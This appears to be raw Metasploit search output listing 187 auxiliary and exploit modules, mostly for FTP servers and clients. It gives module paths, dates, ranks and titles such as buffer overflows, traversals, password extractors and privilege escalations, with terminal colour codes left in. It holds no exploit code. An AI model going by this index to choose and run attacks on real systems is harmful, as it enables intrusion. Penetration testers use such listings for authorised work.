+   0    auxiliary/admin/backupexec/dump                                                      normal     No     Veritas Backup Exec Windows Remote File Access
+   1    auxiliary/admin/cisco/vpn_3000_[45mftp[0m_bypass                           2006-08-23       normal     No     Cisco VPN Concentrator 3000 [45mFTP[0m Unauthorized Administrative Access
+   2    auxiliary/admin/http/netgear_soap_password_extractor                2015-02-11       normal     No     Netgear Unauthenticated SOAP Password Extractor
+   3    auxiliary/admin/http/trendmicro_dlp_traversal                       2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   4    auxiliary/admin/officescan/tmlisten_traversal                                        normal     No     TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access
+   5    auxiliary/admin/t[45m[45mftp[0m[0m/t[45m[45mftp[0m[0m_transfer_util                                              normal     No     T[45mFTP[0m File Transfer Utility
+   6    auxiliary/admin/tikiwiki/tikidblib                                  2006-11-01       normal     No     TikiWiki Information Disclosure
+   7    auxiliary/dos/http/c[45manon[0m_wireless_printer                           2013-06-18       normal     No     C[45manon[0m Wireless Printer Denial Of Service
+   8    auxiliary/dos/scada/d20_t[45mftp[0m_overflow                               2012-01-19       normal     No     General Electric D20ME T[45mFTP[0m Server Buffer Overflow DoS
+   9    auxiliary/dos/windows/[45mftp[0m/filezilla_admin_user                      2005-11-07       normal     No     FileZilla [45mFTP[0m Server Admin Interface Denial of Service
+   10   auxiliary/dos/windows/[45mftp[0m/filezilla_server_port                     2006-12-11       normal     No     FileZilla [45mFTP[0m Server Malformed PORT Denial of Service
+   11   auxiliary/dos/windows/[45m[45mftp[0m[0m/guild[45m[45mftp[0m[0m_cwdlist                          2008-10-12       normal     No     Guild [45mFTP[0md 0.999.8.11/0.999.14 Heap Corruption
+   12   auxiliary/dos/windows/[45m[45mftp[0m[0m/iis75_[45m[45mftp[0m[0md_iac_bof                        2010-12-21       normal     No     Microsoft IIS [45mFTP[0m Server Encoded Response Overflow Trigger
+   13   auxiliary/dos/windows/[45mftp[0m/iis_list_exhaustion                       2009-09-03       normal     No     Microsoft IIS [45mFTP[0m Server LIST Stack Exhaustion
+   14   auxiliary/dos/windows/[45m[45mftp[0m[0m/solar[45m[45mftp[0m[0m_user                             2011-02-22       normal     No     Solar [45mFTP[0m Server Malformed USER Denial of Service
+   15   auxiliary/dos/windows/[45mftp[0m/titan626_site                             2008-10-14       normal     No     Titan [45mFTP[0m Server 6.26.630 SITE WHO DoS
+   16   auxiliary/dos/windows/[45m[45mftp[0m[0m/vic[45m[45mftp[0m[0ms50_list                            2008-10-24       normal     No     Victory [45mFTP[0m Server 5.0 LIST DoS
+   17   auxiliary/dos/windows/[45m[45mftp[0m[0m/win[45m[45mftp[0m[0m230_nlst                            2008-09-26       normal     No     Win[45mFTP[0m 2.3.0 NLST Denial of Service
+   18   auxiliary/dos/windows/[45mftp[0m/xmeasy560_nlst                            2008-10-13       normal     No     XM Easy Personal [45mFTP[0m Server 5.6.0 NLST DoS
+   19   auxiliary/dos/windows/[45mftp[0m/xmeasy570_nlst                            2009-03-27       normal     No     XM Easy Personal [45mFTP[0m Server 5.7.0 NLST DoS
+   20   auxiliary/dos/windows/t[45mftp[0m/pt360_write                              2008-10-29       normal     No     PacketTrap T[45mFTP[0m Server 2.2.5459.0 DoS
+   21   auxiliary/dos/windows/t[45mftp[0m/solarwinds                               2010-05-21       normal     No     SolarWinds T[45mFTP[0m Server 10.4.0.10 Denial of Service
+   22   auxiliary/fuzzers/[45m[45mftp[0m[0m/client_[45m[45mftp[0m[0m                                                     normal     No     Simple [45mFTP[0m Client Fuzzer
+   23   auxiliary/fuzzers/[45m[45mftp[0m[0m/[45m[45mftp[0m[0m_pre_post                                                   normal     No     Simple [45mFTP[0m Fuzzer
+   24   auxiliary/gather/apple_safari_[45mftp[0m_url_cookie_theft                  2015-04-08       normal     No     Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft
+   25   auxiliary/gather/d20pass                                            2012-01-19       normal     No     General Electric D20 Password Recovery
+   26   auxiliary/gather/jenkins_cred_recovery                                               normal     Yes    Jenkins Domain Credential Recovery
+   27   auxiliary/gather/konica_minolta_pwd_extract                                          normal     No     Konica Minolta Password Extractor
+   28   auxiliary/gather/vmware_vcenter_vmdir_ldap                          2020-04-09       normal     No     VMware vCenter Server vmdir Information Disclosure
+   29   auxiliary/scanner/dcerpc/hidden                                                      normal     No     Hidden DCERPC Service Discovery
+   30   auxiliary/scanner/[45mftp[0m/[45manon[0mymous                                                      normal     No     [45mAnon[0mymous [45mFTP[0m Access Detection
+   31   auxiliary/scanner/[45m[45mftp[0m[0m/bison_[45m[45mftp[0m[0m_traversal                           2015-09-28       normal     Yes    BisonWare Bison[45mFTP[0m Server 3.5 Directory Traversal Information Disclosure
+   32   auxiliary/scanner/[45m[45mftp[0m[0m/colorado_[45m[45mftp[0m[0m_traversal                        2016-08-11       normal     Yes    Colorado[45mFTP[0m Server 1.3 Build 8 Directory Traversal Information Disclosure
+   33   auxiliary/scanner/[45m[45mftp[0m[0m/easy_file_sharing_[45m[45mftp[0m[0m                         2017-03-07       normal     Yes    Easy File Sharing [45mFTP[0m Server 3.6 Directory Traversal
+   34   auxiliary/scanner/[45m[45mftp[0m[0m/[45m[45mftp[0m[0m_login                                                      normal     No     [45mFTP[0m Authentication Scanner
+   35   auxiliary/scanner/[45m[45mftp[0m[0m/[45m[45mftp[0m[0m_version                                                    normal     No     [45mFTP[0m Version Scanner
+   36   auxiliary/scanner/[45m[45mftp[0m[0m/konica_[45m[45mftp[0m[0m_traversal                          2015-09-22       normal     Yes    Konica Minolta [45mFTP[0m Utility 1.00 Directory Traversal Information Disclosure
+   37   auxiliary/scanner/[45m[45mftp[0m[0m/pcman_[45m[45mftp[0m[0m_traversal                           2015-09-28       normal     Yes    PCMan [45mFTP[0m Server 2.0.7 Directory Traversal Information Disclosure
+   38   auxiliary/scanner/[45m[45mftp[0m[0m/titan[45m[45mftp[0m[0m_xcrc_traversal                       2010-06-15       normal     No     Titan [45mFTP[0m XCRC Directory Traversal Information Disclosure
+   39   auxiliary/scanner/http/c[45manon[0m_wireless                               2013-06-18       normal     No     C[45manon[0m Printer Wireless Configuration Disclosure
+   40   auxiliary/scanner/http/frontpage_login                                               normal     No     FrontPage Server Extensions [45mAnon[0mymous Login Scanner
+   41   auxiliary/scanner/http/mediawiki_svg_fileaccess                                      normal     No     MediaWiki SVG XML Entity Expansion Remote File Access
+   42   auxiliary/scanner/http/titan_[45mftp[0m_admin_pwd                                           normal     No     Titan [45mFTP[0m Administrative Password Disclosure
+   43   auxiliary/scanner/misc/zenworks_preboot_fileaccess                                   normal     No     Novell ZENworks Configuration Management Preboot Service Remote File Access
+   44   auxiliary/scanner/portscan/[45mftp[0mbounce                                                 normal     No     [45mFTP[0m Bounce Port Scanner
+   45   auxiliary/scanner/printer/c[45manon[0m_iradv_pwd_extract                                    normal     No     C[45manon[0m IR-Adv Password Extractor
+   46   auxiliary/scanner/quake/server_info                                                  normal     No     Gather Quake Server Information
+   47   auxiliary/scanner/rsync/modules_list                                                 normal     No     List Rsync Modules
+   48   auxiliary/scanner/snmp/cisco_config_t[45mftp[0m                                             normal     No     Cisco IOS SNMP Configuration Grabber (T[45mFTP[0m)
+   49   auxiliary/scanner/snmp/cisco_upload_file                                             normal     No     Cisco IOS SNMP File Upload (T[45mFTP[0m)
+   50   auxiliary/scanner/ssh/cerberus_s[45mftp[0m_enumusers                       2014-05-27       normal     No     Cerberus [45m[45mFTP[0m[0m Server S[45m[45mFTP[0m[0m Username Enumeration
+   51   auxiliary/scanner/t[45m[45mftp[0m[0m/ipswitch_whatsupgold_t[45m[45mftp[0m[0m                    2011-12-12       normal     No     IpSwitch WhatsUp Gold T[45mFTP[0m Directory Traversal
+   52   auxiliary/scanner/t[45m[45mftp[0m[0m/netdecision_t[45m[45mftp[0m[0m                             2009-05-16       normal     No     NetDecision 4.2 T[45mFTP[0m Directory Traversal
+   53   auxiliary/scanner/t[45m[45mftp[0m[0m/t[45m[45mftp[0m[0mbrute                                                     normal     No     T[45mFTP[0m Brute Forcer
+   54   auxiliary/server/capture/[45mftp[0m                                                         normal     No     Authentication Capture: [45mFTP[0m
+   55   auxiliary/server/[45mftp[0m                                                                 normal     No     [45mFTP[0m File Server
+   56   auxiliary/server/pxeexploit                                                          normal     No     PXE Boot Exploit Server
+   57   auxiliary/server/t[45mftp[0m                                                                normal     No     T[45mFTP[0m File Server
+   58   auxiliary/server/wget_symlink_file_write                            2014-10-27       normal     No     GNU Wget [45mFTP[0m Symlink Arbitrary Filesystem Access
+   59   exploit/freebsd/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0m_telnet_iac                               2010-11-01       [32mgreat[0m      Yes    Pro[45mFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   60   exploit/freebsd/local/intel_sysret_priv_esc                         2012-06-12       [32mgreat[0m      Yes    FreeBSD Intel SYSRET Privilege Escalation
+   61   exploit/linux/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0m_sreplace                                   2006-11-26       [32mgreat[0m      Yes    Pro[45mFTP[0mD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   62   exploit/linux/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0m_telnet_iac                                 2010-11-01       [32mgreat[0m      Yes    Pro[45mFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   63   exploit/linux/http/cisco_prime_inf_rce                              2018-10-04       [32mexcellent[0m  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   64   exploit/linux/http/dlink_dir605l_captcha_bof                        2012-10-08       manual     Yes    D-Link DIR-605L Captcha Handling Buffer Overflow
+   65   exploit/linux/http/dlink_dspw110_cookie_noauth_exec                 2015-06-12       normal     Yes    D-Link Cookie Command Execution
+   66   exploit/linux/http/dlink_dspw215_info_cgi_bof                       2014-05-22       normal     Yes    D-Link info.cgi POST Request Buffer Overflow
+   67   exploit/linux/http/dlink_hedwig_cgi_bof                             2013-02-08       normal     Yes    D-Link hedwig.cgi Buffer Overflow in Cookie Header
+   68   exploit/linux/http/dlink_hnap_bof                                   2014-05-15       normal     Yes    D-Link HNAP Request Remote Buffer Overflow
+   69   exploit/linux/http/hp_system_management                             2012-09-01       normal     Yes    HP System Management [45mAnon[0mymous Access Code Execution
+   70   exploit/linux/http/linksys_wrt160nv2_apply_exec                     2013-02-11       [32mexcellent[0m  No     Linksys WRT160nv2 apply.cgi Remote Command Injection
+   71   exploit/linux/http/tiki_calendar_exec                               2016-06-06       [32mexcellent[0m  Yes    Tiki-Wiki CMS Calendar Command Execution
+   72   exploit/linux/local/af_packet_packet_set_ring_priv_esc              2017-03-29       good       Yes    AF_PACKET packet_set_ring Privilege Escalation
+   73   exploit/linux/local/bpf_priv_esc                                    2016-05-04       good       Yes    Linux BPF doubleput UAF Privilege Escalation
+   74   exploit/linux/local/bpf_sign_extension_priv_esc                     2017-11-12       [32mgreat[0m      Yes    Linux BPF Sign Extension Local Privilege Escalation
+   75   exploit/linux/local/nested_namespace_idmap_limit_priv_esc           2018-11-15       [32mgreat[0m      Yes    Linux Nested User Namespace idmap Limit Local Privilege Escalation
+   76   exploit/linux/local/network_manager_vpnc_username_priv_esc          2018-07-26       [32mexcellent[0m  Yes    Network Manager VPNC Username Privilege Escalation
+   77   exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc  2018-11-01       good       Yes    Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation
+   78   exploit/linux/local/servu_[45mftp[0m_server_prepareinstallation_priv_esc   2019-06-05       [32mexcellent[0m  Yes    Serv-U [45mFTP[0m Server prepareinstallation Privilege Escalation
+   79   exploit/linux/local/ufo_privilege_escalation                        2017-08-10       good       Yes    Linux Kernel UDP Fragmentation Offset (UFO) Privilege Escalation
+   80   exploit/linux/misc/netsupport_manager_agent                         2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   81   exploit/linux/samba/is_known_pipename                               2017-03-24       [32mexcellent[0m  Yes    Samba is_known_pipename() Arbitrary Module Load
+   82   exploit/linux/samba/trans2open                                      2003-04-07       [32mgreat[0m      No     Samba trans2open Overflow (Linux x86)
+   83   exploit/linux/snmp/awind_snmp_exec                                  2019-03-27       [32mexcellent[0m  Yes    AwindInc SNMP Service Command Injection
+   84   exploit/mainframe/[45m[45mftp[0m[0m/[45m[45mftp[0m[0m_jcl_creds                                 2013-05-12       normal     Yes    [45mFTP[0m JCL Execution
+   85   exploit/multi/browser/firefox_svg_plugin                            2013-01-08       [32mexcellent[0m  No     Firefox 17.0.1 Flash Privileged Code Injection
+   86   exploit/multi/[45m[45mftp[0m[0m/pure[45m[45mftp[0m[0md_bash_env_exec                            2014-09-24       [32mexcellent[0m  Yes    Pure-[45mFTP[0md External Authentication Bash Environment Variable Code Injection (Shellshock)
+   87   exploit/multi/[45m[45mftp[0m[0m/wu[45m[45mftp[0m[0md_site_exec_format                           2000-06-22       [32mgreat[0m      Yes    WU-[45mFTP[0mD SITE EXEC/INDEX Format String Vulnerability
+   88   exploit/multi/http/mantisbt_php_exec                                2014-11-08       [32mgreat[0m      Yes    MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability
+   89   exploit/multi/http/netwin_surge[45mftp[0m_exec                             2012-12-06       good       Yes    Netwin Surge[45mFTP[0m Remote Command Execution
+   90   exploit/multi/http/sit_file_upload                                  2011-11-10       [32mexcellent[0m  Yes    Support Incident Tracker Remote Command Execution
+   91   exploit/multi/misc/wireshark_lwres_getaddrbyname                    2010-01-27       [32mgreat[0m      No     Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow
+   92   exploit/multi/misc/wireshark_lwres_getaddrbyname_loop               2010-01-27       [32mgreat[0m      No     Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)
+   93   exploit/multi/wyse/hagent_untrusted_hsdata                          2009-07-10       [32mexcellent[0m  No     Wyse Rapport Hagent Fake Hserver Command Execution
+   94   exploit/openbsd/local/dynamic_loader_chpass_privesc                 2019-12-11       [32mexcellent[0m  Yes    OpenBSD Dynamic Loader chpass Privilege Escalation
+   95   exploit/osx/browser/safari_file_policy                              2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
+   96   exploit/osx/[45m[45mftp[0m[0m/webstar_[45m[45mftp[0m[0m_user                                    2004-07-13       average    No     WebSTAR [45mFTP[0m Server USER Overflow
+   97   exploit/unix/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0md_133c_backdoor                              2010-12-02       [32mexcellent[0m  No     Pro[45mFTP[0mD-1.3.3c Backdoor Command Execution
+   98   exploit/unix/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0md_modcopy_exec                               2015-04-22       [32mexcellent[0m  Yes    Pro[45mFTP[0mD 1.3.5 Mod_Copy Command Execution
+   99   exploit/unix/[45m[45mftp[0m[0m/vs[45m[45mftp[0m[0md_234_backdoor                                2011-07-03       [32mexcellent[0m  No     VS[45mFTP[0mD v2.3.4 Backdoor Command Execution
+   100  exploit/unix/http/tn[45mftp[0m_savefile                                    2014-10-28       [32mexcellent[0m  No     tn[45mftp[0m "savefile" Arbitrary Command Execution
+   101  exploit/unix/local/netbsd_mail_local                                2016-07-07       [32mexcellent[0m  No     NetBSD mail.local Privilege Escalation
+   102  exploit/unix/webapp/foswiki_maketext                                2012-12-03       [32mexcellent[0m  Yes    Foswiki MAKETEXT Remote Command Execution
+   103  exploit/unix/webapp/twiki_maketext                                  2012-12-15       [32mexcellent[0m  Yes    TWiki MAKETEXT Remote Command Execution
+   104  exploit/unix/webapp/wp_total_cache_exec                             2013-04-17       [32mexcellent[0m  Yes    WordPress W3 Total Cache PHP Code Execution
+   105  exploit/windows/browser/firefox_smil_uaf                            2016-11-30       normal     No     Firefox nsSMILTimeContainer::NotifyTimeChange() RCE
+   106  exploit/windows/fileformat/bp[45mftp[0m_client_bps_bof                     2014-07-24       normal     No     BulletProof [45mFTP[0m Client BPS Buffer Overflow
+   107  exploit/windows/fileformat/i[45mftp[0m_schedule_bof                        2014-11-06       normal     No     i-[45mFTP[0m Schedule Buffer Overflow
+   108  exploit/windows/[45m[45mftp[0m[0m/32bit[45m[45mftp[0m[0m_list_reply                             2010-10-12       good       No     32bit [45mFTP[0m Client Stack Buffer Overflow
+   109  exploit/windows/[45m[45mftp[0m[0m/3cdaemon_[45m[45mftp[0m[0m_user                               2005-01-04       average    Yes    3Com 3CDaemon 2.0 [45mFTP[0m Username Overflow
+   110  exploit/windows/[45mftp[0m/aasync_list_reply                               2010-10-12       good       No     AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)
+   111  exploit/windows/[45mftp[0m/ability_server_stor                             2004-10-22       normal     Yes    Ability Server 2.34 STOR Command Stack Buffer Overflow
+   112  exploit/windows/[45m[45mftp[0m[0m/absolute_[45m[45mftp[0m[0m_list_bof                           2011-11-09       normal     No     Absolute[45mFTP[0m 1.9.6 - 2.2.10 LIST Command Remote Buffer Overflow
+   113  exploit/windows/[45m[45mftp[0m[0m/ayukov_n[45m[45mftp[0m[0m                                     2017-10-21       normal     No     Ayukov N[45m[45mFTP[0m[0m [45m[45mFTP[0m[0m Client Buffer Overflow
+   114  exploit/windows/[45m[45mftp[0m[0m/bison_[45m[45mftp[0m[0m_bof                                   2011-08-07       normal     Yes    BisonWare Bison[45mFTP[0m Server Buffer Overflow
+   115  exploit/windows/[45m[45mftp[0m[0m/cesar[45m[45mftp[0m[0m_mkd                                    2006-06-12       average    Yes    Cesar [45mFTP[0m 0.99g MKD Command Buffer Overflow
+   116  exploit/windows/[45m[45mftp[0m[0m/comsnd_[45m[45mftp[0m[0md_fmtstr                              2012-06-08       good       Yes    ComSnd[45mFTP[0m v1.3.7 Beta USER Format String (Write4) Vulnerability
+   117  exploit/windows/[45m[45mftp[0m[0m/dream[45m[45mftp[0m[0m_format                                 2004-03-03       good       Yes    BolinTech Dream [45mFTP[0m Server 1.02 Format String
+   118  exploit/windows/[45mftp[0m/easyfilesharing_pass                            2006-07-31       average    Yes    Easy File Sharing [45mFTP[0m Server 2.0 PASS Overflow
+   119  exploit/windows/[45m[45mftp[0m[0m/easy[45m[45mftp[0m[0m_cwd_fixret                              2010-02-16       [32mgreat[0m      Yes    Easy[45mFTP[0m Server CWD Command Stack Buffer Overflow
+   120  exploit/windows/[45m[45mftp[0m[0m/easy[45m[45mftp[0m[0m_list_fixret                             2010-07-05       [32mgreat[0m      Yes    Easy[45mFTP[0m Server LIST Command Stack Buffer Overflow
+   121  exploit/windows/[45m[45mftp[0m[0m/easy[45m[45mftp[0m[0m_mkd_fixret                              2010-04-04       [32mgreat[0m      Yes    Easy[45mFTP[0m Server MKD Command Stack Buffer Overflow
+   122  exploit/windows/[45mftp[0m/filecopa_list_overflow                          2006-07-19       average    No     FileCopa [45mFTP[0m Server Pre 18 Jul Version
+   123  exploit/windows/[45mftp[0m/filewrangler_list_reply                         2010-10-12       good       No     FileWrangler 5.30 Stack Buffer Overflow
+   124  exploit/windows/[45m[45mftp[0m[0m/freefloat[45m[45mftp[0m[0m_user                               2012-06-12       normal     Yes    Free Float [45mFTP[0m Server USER Command Buffer Overflow
+   125  exploit/windows/[45m[45mftp[0m[0m/freefloat[45m[45mftp[0m[0m_wbem                               2012-12-07       [32mexcellent[0m  Yes    FreeFloat [45mFTP[0m Server Arbitrary File Upload
+   126  exploit/windows/[45m[45mftp[0m[0m/free[45m[45mftp[0m[0md_pass                                   2013-08-20       normal     Yes    free[45mFTP[0md PASS Command Buffer Overflow
+   127  exploit/windows/[45m[45mftp[0m[0m/free[45m[45mftp[0m[0md_user                                   2005-11-16       average    Yes    free[45mFTP[0md 1.0 Username Overflow
+   128  exploit/windows/[45m[45mftp[0m[0m/[45m[45mftp[0m[0mgetter_pwd_reply                             2010-10-12       good       No     [45mFTP[0mGetter Standard v3.55.0.05 Stack Buffer Overflow (PWD)
+   129  exploit/windows/[45m[45mftp[0m[0m/[45m[45mftp[0m[0mpad_list_reply                               2010-10-12       good       No     [45mFTP[0mPad 1.2.0 Stack Buffer Overflow
+   130  exploit/windows/[45m[45mftp[0m[0m/[45m[45mftp[0m[0mshell51_pwd_reply                            2010-10-12       good       No     [45mFTP[0mShell 5.1 Stack Buffer Overflow
+   131  exploit/windows/[45m[45mftp[0m[0m/[45m[45mftp[0m[0mshell_cli_bof                                2017-03-04       normal     No     [45mFTP[0mShell client 6.70 (Enterprise edition) Stack Buffer Overflow
+   132  exploit/windows/[45m[45mftp[0m[0m/[45m[45mftp[0m[0msynch_list_reply                             2010-10-12       good       No     [45mFTP[0m Synchronizer Professional 4.0.73.274 Stack Buffer Overflow
+   133  exploit/windows/[45mftp[0m/gekkomgr_list_reply                             2010-10-12       good       No     Gekko Manager [45mFTP[0m Client Stack Buffer Overflow
+   134  exploit/windows/[45m[45mftp[0m[0m/globalscape[45m[45mftp[0m[0m_input                            2005-05-01       [32mgreat[0m      No     GlobalSCAPE Secure [45mFTP[0m Server Input Overflow
+   135  exploit/windows/[45m[45mftp[0m[0m/golden[45m[45mftp[0m[0m_pass_bof                              2011-01-23       average    Yes    Golden[45mFTP[0m PASS Stack Buffer Overflow
+   136  exploit/windows/[45mftp[0m/httpdx_tolog_format                             2009-11-17       [32mgreat[0m      Yes    HTTPDX tolog() Function Format String Vulnerability
+   137  exploit/windows/[45m[45mftp[0m[0m/km[45m[45mftp[0m[0m_utility_cwd                               2015-08-23       normal     Yes    Konica Minolta [45mFTP[0m Utility 1.00 Post Auth CWD Command SEH Overflow
+   138  exploit/windows/[45mftp[0m/labf_nfsaxe                                     2017-05-15       normal     No     LabF nfsAxe 3.7 [45mFTP[0m Client Stack Buffer Overflow
+   139  exploit/windows/[45m[45mftp[0m[0m/leap[45m[45mftp[0m[0m_list_reply                              2010-10-12       good       No     Leap[45mFTP[0m 3.0.1 Stack Buffer Overflow
+   140  exploit/windows/[45m[45mftp[0m[0m/leap[45m[45mftp[0m[0m_pasv_reply                              2003-06-09       normal     No     LeapWare Leap[45mFTP[0m v2.7.3.600 PASV Reply Client Overflow
+   141  exploit/windows/[45m[45mftp[0m[0m/ms09_053_[45m[45mftp[0m[0md_nlst                              2009-08-31       [32mgreat[0m      No     MS09-053 Microsoft IIS [45mFTP[0m Server NLST Response Overflow
+   142  exploit/windows/[45m[45mftp[0m[0m/netterm_net[45m[45mftp[0m[0md_user                            2005-04-26       [32mgreat[0m      Yes    NetTerm Net[45mFTP[0mD USER Buffer Overflow
+   143  exploit/windows/[45mftp[0m/odin_list_reply                                 2010-10-12       good       No     Odin Secure [45mFTP[0m 4.1 Stack Buffer Overflow (LIST)
+   144  exploit/windows/[45m[45mftp[0m[0m/open_[45m[45mftp[0m[0md_wbem                                  2012-06-18       [32mexcellent[0m  Yes    Open-[45mFTP[0mD 1.2 Arbitrary File Upload
+   145  exploit/windows/[45m[45mftp[0m[0m/oracle9i_xdb_[45m[45mftp[0m[0m_pass                           2003-08-18       [32mgreat[0m      Yes    Oracle 9i XDB [45mFTP[0m PASS Overflow (win32)
+   146  exploit/windows/[45m[45mftp[0m[0m/oracle9i_xdb_[45m[45mftp[0m[0m_unlock                         2003-08-18       [32mgreat[0m      Yes    Oracle 9i XDB [45mFTP[0m UNLOCK Overflow (win32)
+   147  exploit/windows/[45mftp[0m/pcman_put                                       2015-08-07       normal     Yes    PCMAN [45mFTP[0m Server Buffer Overflow - PUT Command
+   148  exploit/windows/[45mftp[0m/pcman_stor                                      2013-06-27       normal     Yes    PCMAN [45mFTP[0m Server Post-Authentication STOR Command Stack Buffer Overflow
+   149  exploit/windows/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0m_banner                                   2009-08-25       normal     No     Pro[45mFTP[0m 2.9 Banner Remote Buffer Overflow
+   150  exploit/windows/[45mftp[0m/quickshare_traversal_write                      2011-02-03       [32mexcellent[0m  Yes    QuickShare File Server 1.2.1 Directory Traversal Vulnerability
+   151  exploit/windows/[45mftp[0m/ricoh_dl_bof                                    2012-03-01       normal     Yes    Ricoh DC DL-10 SR10 [45mFTP[0m USER Command Buffer Overflow
+   152  exploit/windows/[45m[45mftp[0m[0m/sami_[45m[45mftp[0m[0md_list                                  2013-02-27       low        No     Sami [45mFTP[0m Server LIST Command Buffer Overflow
+   153  exploit/windows/[45m[45mftp[0m[0m/sami_[45m[45mftp[0m[0md_user                                  2006-01-24       normal     Yes    KarjaSoft Sami [45mFTP[0m Server v2.02 USER Overflow
+   154  exploit/windows/[45m[45mftp[0m[0m/sasser_[45m[45mftp[0m[0md_port                                2004-05-10       average    No     Sasser Worm avserve [45mFTP[0m PORT Buffer Overflow
+   155  exploit/windows/[45m[45mftp[0m[0m/script[45m[45mftp[0m[0m_list                                  2011-10-12       good       No     Script[45mFTP[0m LIST Remote Buffer Overflow
+   156  exploit/windows/[45mftp[0m/seagull_list_reply                              2010-10-12       good       No     Seagull [45mFTP[0m v3.3 Build 409 Stack Buffer Overflow
+   157  exploit/windows/[45mftp[0m/servu_chmod                                     2004-12-31       normal     Yes    Serv-U [45mFTP[0m Server Buffer Overflow
+   158  exploit/windows/[45mftp[0m/servu_mdtm                                      2004-02-26       good       Yes    Serv-U [45mFTP[0mD MDTM Overflow
+   159  exploit/windows/[45m[45mftp[0m[0m/slim[45m[45mftp[0m[0md_list_concat                            2005-07-21       [32mgreat[0m      No     Slim[45mFTP[0md LIST Concatenation Overflow
+   160  exploit/windows/[45mftp[0m/trellian_client_pasv                            2010-04-11       normal     No     Trellian [45mFTP[0m Client 3.01 PASV Remote Buffer Overflow
+   161  exploit/windows/[45m[45mftp[0m[0m/turbo[45m[45mftp[0m[0m_port                                   2012-10-03       [32mgreat[0m      Yes    Turbo [45mFTP[0m Server 1.30.823 PORT Overflow
+   162  exploit/windows/[45m[45mftp[0m[0m/vermillion_[45m[45mftp[0m[0md_port                            2009-09-23       [32mgreat[0m      Yes    Vermillion [45mFTP[0m Daemon PORT Command Memory Corruption
+   163  exploit/windows/[45m[45mftp[0m[0m/war[45m[45mftp[0m[0md_165_pass                                1998-03-19       average    No     War-[45mFTP[0mD 1.65 Password Overflow
+   164  exploit/windows/[45m[45mftp[0m[0m/war[45m[45mftp[0m[0md_165_user                                1998-03-19       average    No     War-[45mFTP[0mD 1.65 Username Overflow
+   165  exploit/windows/[45m[45mftp[0m[0m/w[45m[45mftp[0m[0md_size                                      2006-08-23       average    No     Texas Imperial Software W[45mFTP[0mD 3.23 SIZE Overflow
+   166  exploit/windows/[45mftp[0m/winaxe_server_ready                             2016-11-03       good       No     WinaXe 7.7 [45mFTP[0m Client Remote Buffer Overflow
+   167  exploit/windows/[45m[45mftp[0m[0m/wing_[45m[45mftp[0m[0m_admin_exec                             2014-06-19       [32mexcellent[0m  Yes    Wing [45mFTP[0m Server Authenticated Command Execution
+   168  exploit/windows/[45m[45mftp[0m[0m/ws[45m[45mftp[0m[0m_server_503_mkd                            2004-11-29       [32mgreat[0m      Yes    WS-[45mFTP[0m Server 5.03 MKD Overflow
+   169  exploit/windows/[45m[45mftp[0m[0m/ws[45m[45mftp[0m[0m_server_505_xmd5                           2006-09-14       average    Yes    Ipswitch WS_[45mFTP[0m Server 5.05 XMD5 Overflow
+   170  exploit/windows/[45m[45mftp[0m[0m/x[45m[45mftp[0m[0m_client_pwd                                 2010-04-22       normal     No     X[45mftp[0m [45mFTP[0m Client 3.0 PWD Remote Buffer Overflow
+   171  exploit/windows/[45mftp[0m/xlink_client                                    2009-10-03       normal     No     Xlink [45mFTP[0m Client Buffer Overflow
+   172  exploit/windows/[45mftp[0m/xlink_server                                    2009-10-03       good       Yes    Xlink [45mFTP[0m Server Buffer Overflow
+   173  exploit/windows/http/easyfilesharing_post                           2017-06-12       normal     No     Easy File Sharing HTTP Server 7.2 POST Buffer Overflow
+   174  exploit/windows/http/easyfilesharing_seh                            2015-12-02       normal     No     Easy File Sharing HTTP Server 7.2 SEH Overflow
+   175  exploit/windows/http/easy[45mftp[0m_list                                   2010-02-18       [32mgreat[0m      Yes    Easy[45mFTP[0m Server list.html path Stack Buffer Overflow
+   176  exploit/windows/http/httpdx_tolog_format                            2009-11-17       [32mgreat[0m      Yes    HTTPDX tolog() Function Format String Vulnerability
+   177  exploit/windows/http/landesk_thinkmanagement_upload_asp             2012-02-15       [32mexcellent[0m  No     LANDesk Lenovo ThinkManagement Console Remote Command Execution
+   178  exploit/windows/http/plesk_mylittleadmin_viewstate                  2020-05-15       [32mexcellent[0m  Yes    Plesk/myLittleAdmin ViewState .NET Deserialization
+   179  exploit/windows/local/pxeexploit                                    2011-08-05       [32mexcellent[0m  No     PXE Exploit Server
+   180  exploit/windows/misc/ais_esel_server_rce                            2019-03-27       [32mexcellent[0m  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
+   181  exploit/windows/misc/altiris_ds_sqli                                2008-05-15       normal     Yes    Symantec Altiris DS SQL Injection
+   182  exploit/windows/misc/netcat110_nt                                   2004-12-27       [32mgreat[0m      No     Netcat v1.10 NT Stack Buffer Overflow
+   183  exploit/windows/mssql/mssql_payload                                 2000-05-30       [32mexcellent[0m  Yes    Microsoft SQL Server Payload Execution
+   184  exploit/windows/mssql/mssql_payload_sqli                            2000-05-30       [32mexcellent[0m  No     Microsoft SQL Server Payload Execution via SQL Injection
+   185  exploit/windows/novell/zenworks_preboot_op21_bof                    2010-03-30       normal     No     Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow
+   186  exploit/windows/smb/ms06_040_netapi                                 2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathC[45manon[0micalize Overflow
